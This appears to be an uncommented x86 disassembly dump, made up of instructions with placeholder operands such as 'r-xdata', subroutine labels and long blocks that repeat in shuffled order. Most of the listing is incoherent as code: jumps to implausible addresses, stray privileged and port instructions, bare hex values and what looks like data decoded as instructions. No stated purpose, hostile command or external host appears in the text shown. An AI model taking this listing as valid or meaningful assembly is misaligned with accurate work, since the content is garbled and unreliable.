jpo 0xdeb676
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jno r-xdata
and ebx 0x870f4975
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
pop ecx
jne r-xdata
jbe 0xffd03a4
add esp 0x4
jae r-xdata
jl 0xf3b428
jno r-xdata
jge 0xffffffffffa0b6e3
pop eax
jg r-xdata
jge 0xffffffff894f8b21
add [ eax ] al
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff8428ab9d
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4031f4
jne r-xdata
add esp 0x8
jg 0xf44f683
jae r-xdata
ja 0xffffffffa3c34090
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f8b21
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428ab9d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd03a4
jno r-xdata
jge 0xffffffffffa0b6e3
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40325c
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcab4a6
jno r-xdata
js 0x7f44f665
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158b682
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jne r-xdata
sub edi 0x64244481
jno r-xdata
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jge r-xdata
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
jne r-xdata
inc eax
add [ ebx + 0x5a5928ec ] al
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9bb34d
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffd03a4
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4032c0
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_4033bd
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_4032fe
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x58662877
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_403321
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x58662877
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c1423f
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
push esp
push eax
call sub_4033a4
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_403324
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40333b
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119ba7e
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd42e7
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b8af
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x58662877
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
